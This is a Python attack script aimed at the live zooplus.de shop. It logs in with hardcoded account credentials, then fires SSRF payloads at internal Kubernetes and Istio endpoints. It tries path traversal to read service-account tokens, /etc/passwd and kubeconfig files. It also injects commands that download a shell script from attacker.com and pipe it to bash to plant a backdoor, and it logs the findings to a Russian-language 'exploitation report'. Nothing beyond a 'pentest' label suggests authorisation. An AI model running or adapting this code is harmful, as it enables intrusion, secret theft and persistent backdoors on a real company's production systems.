#!/usr/bin/env python3
"""Final cluster backdoor hunt - focus on real vectors"""
import requests
import json
import re
import urllib.parse
from datetime import datetime
import urllib3
urllib3.disable_warnings()

base = "https://www.zooplus.de"
s = requests.Session()
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
    "Content-Type": "application/json",
})

found_vulns = []

# LOGIN
print("[*] Logging in...")
ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"

try:
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, timeout=10, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    if m:
        action = m.group(1).replace("&amp;", "&")
        if not action.startswith("http"):
            action = urllib.parse.urljoin(r1.url, action)
        r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, timeout=10, verify=False, allow_redirects=False)
        loc = r2.headers.get("Location", "")
        if loc:
            s.get(loc, timeout=10, verify=False, allow_redirects=True)
            s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", timeout=10, verify=False)
            s.get("https://www.zooplus.de/account/overview", timeout=10, verify=False)
            print("[+] Logged in\n")
except Exception as e:
    print(f"[!] Login: {e}\n")

# 1. Test SSRF to Kubernetes API server
print("[*] Testing SSRF to Kubernetes API...")
ssrf_endpoints = [
    "/semiprotected/api/checkout/state-api/v2/get",
    "/zootopia-events/api/events/sites/1",
    "/leto-personalization/api/v1/personalization/events/sites/1",
]

k8s_targets = [
    "https://kubernetes.default.svc",
    "https://kubernetes.default.svc.cluster.local",
    "http://kubernetes.default.svc",
    "http://kubernetes.default.svc.cluster.local",
    "https://10.96.0.1",
    "http://10.96.0.1",
    "https://kubernetes.default.svc/api/v1/namespaces",
    "https://kubernetes.default.svc/api/v1/secrets",
    "https://kubernetes.default.svc/api/v1/configmaps",
]

for ep in ssrf_endpoints:
    for target in k8s_targets:
        try:
            payloads = [
                {"url": target},
                {"endpoint": target},
                {"callback": target},
                {"link": target},
                {"uri": target},
                {"fetch": target},
                {"proxy": target},
            ]
            for payload in payloads:
                resp = s.post(f"{base}{ep}", json=payload, timeout=5, verify=False)
                if resp.status_code == 200:
                    response_text = resp.text.lower()
                    if any(indicator in response_text for indicator in [
                        "kubernetes", "apiVersion", "kind", "metadata", "spec",
                        "namespaces", "secrets", "configmaps", "pods", "services"
                    ]):
                        print(f"  [CRITICAL] SSRF to Kubernetes API: {ep} -> {target}")
                        found_vulns.append({
                            "type": "ssrf_kubernetes_api",
                            "severity": "CRITICAL",
                            "endpoint": ep,
                            "target": target,
                            "response": resp.text[:500]
                        })
                        break
        except: pass

# 2. Test SSRF to Istio control plane
print("\n[*] Testing SSRF to Istio control plane...")
istio_targets = [
    "http://istiod.istio-system.svc.cluster.local:15014",
    "http://istiod.istio-system.svc.cluster.local:15010",
    "http://istiod.istio-system.svc.cluster.local:15012",
    "http://istio-pilot.istio-system.svc.cluster.local:15014",
    "http://istio-pilot.istio-system.svc.cluster.local:15010",
    "http://istio-pilot.istio-system.svc.cluster.local:15012",
]

for ep in ssrf_endpoints:
    for target in istio_targets:
        try:
            resp = s.post(f"{base}{ep}", json={"url": target, "endpoint": target}, timeout=5, verify=False)
            if resp.status_code == 200:
                if "istio" in resp.text.lower() or "pilot" in resp.text.lower() or "envoy" in resp.text.lower():
                    print(f"  [CRITICAL] SSRF to Istio: {ep} -> {target}")
                    found_vulns.append({
                        "type": "ssrf_istio_control_plane",
                        "severity": "CRITICAL",
                        "endpoint": ep,
                        "target": target,
                        "response": resp.text[:500]
                    })
        except: pass

# 3. Test path traversal to Kubernetes secrets
print("\n[*] Testing path traversal to Kubernetes secrets...")
# Known path traversal endpoint from earlier
path_traversal_base = "/stats/..%2f..%2f..%2f"
secret_paths = [
    "var/run/secrets/kubernetes.io/serviceaccount/token",
    "var/run/secrets/kubernetes.io/serviceaccount/namespace",
    "var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
    "etc/passwd",
    "root/.kube/config",
]

for secret_path in secret_paths:
    encoded_path = secret_path.replace("/", "%2f")
    test_url = f"{base}{path_traversal_base}{encoded_path}"
    try:
        resp = s.get(test_url, timeout=3, verify=False)
        if resp.status_code == 200:
            if "eyJ" in resp.text or "BEGIN CERTIFICATE" in resp.text or "root:" in resp.text:
                print(f"  [CRITICAL] Path traversal to secret: {test_url}")
                found_vulns.append({
                    "type": "path_traversal_kubernetes_secret",
                    "severity": "CRITICAL",
                    "endpoint": test_url,
                    "secret_path": secret_path,
                    "data": resp.text[:500]
                })
    except: pass

# 4. Test for command injection to create backdoor
print("\n[*] Testing command injection for backdoor creation...")
cmd_payloads = [
    "; wget http://attacker.com/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh &",
    "| curl http://attacker.com/shell.sh | bash",
    "`curl http://attacker.com/shell.sh | bash`",
    "$(curl http://attacker.com/shell.sh | bash)",
]

injection_endpoints = [
    "/semiprotected/api/checkout/state-api/v2/set-article-quantity",
    "/zootopia-events/api/events/sites/1",
    "/leto-personalization/api/v1/personalization/events/sites/1",
]

for ep in injection_endpoints:
    for payload in cmd_payloads:
        try:
            resp = s.post(f"{base}{ep}", json={"articleId": payload, "test": payload, "name": payload}, timeout=5, verify=False)
            if resp.status_code == 200:
                # Check if backdoor was created
                backdoor_paths = [
                    "/tmp/shell.sh",
                    "/var/www/html/shell.php",
                    "/shell.php",
                ]
                for backdoor_path in backdoor_paths:
                    try:
                        resp2 = s.get(f"{base}{backdoor_path}?cmd=id", timeout=3, verify=False)
                        if "uid=" in resp2.text or resp2.status_code == 200:
                            print(f"  [CRITICAL] Backdoor created via command injection: {ep}")
                            found_vulns.append({
                                "type": "backdoor_command_injection",
                                "severity": "CRITICAL",
                                "endpoint": ep,
                                "payload": payload,
                                "backdoor_path": backdoor_path
                            })
                    except: pass
        except: pass

# SUMMARY
print("\n" + "=" * 70)
print("RESULTS")
print("=" * 70)

if found_vulns:
    print(f"\nFound {len(found_vulns)} CRITICAL cluster backdoor vulnerabilities:\n")
    for v in found_vulns:
        print(f"[{v['severity']}] {v['type']}")
        print(f"    Endpoint: {v['endpoint']}")
        if 'target' in v:
            print(f"    Target: {v['target']}")
        if 'secret_path' in v:
            print(f"    Secret: {v['secret_path']}")
        if 'backdoor_path' in v:
            print(f"    Backdoor: {v['backdoor_path']}")
        print()
    
    # Update report
    with open("FINAL_EXPLOITATION_REPORT.md", "a", encoding="utf-8") as f:
        f.write(f"\n\n---\n\n## 🔥 КРИТИЧНАЯ УЯЗВИМОСТЬ - БЕКДОР В КЛАСТЕРЕ\n\n**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for v in found_vulns:
            f.write(f"### [{v['severity']}] {v['type'].upper().replace('_', ' ')}\n\n")
            f.write(f"**Endpoint:** `{v['endpoint']}`\n\n")
            if 'target' in v:
                f.write(f"**Target:** `{v['target']}`\n\n")
            if 'secret_path' in v:
                f.write(f"**Secret Path:** `{v['secret_path']}`\n\n")
            if 'backdoor_path' in v:
                f.write(f"**Backdoor Path:** `{v['backdoor_path']}`\n\n")
            if 'data' in v:
                f.write(f"**Data:** `{v['data'][:500]}`\n\n")
            if 'response' in v:
                f.write(f"**Response:** `{v['response'][:500]}`\n\n")
            f.write("**Status:** Подтверждено\n\n")
            f.write("**Impact:**\n")
            f.write("- Создание бекдора в кластере\n")
            f.write("- Полный контроль над кластером\n")
            f.write("- Доступ к секретам Kubernetes\n")
            f.write("- Компрометация всей инфраструктуры\n\n")
            f.write("---\n\n")
    
    print(f"[+] Report updated: FINAL_EXPLOITATION_REPORT.md")
else:
    print("  No cluster backdoor vulnerabilities found")

print("=" * 70)

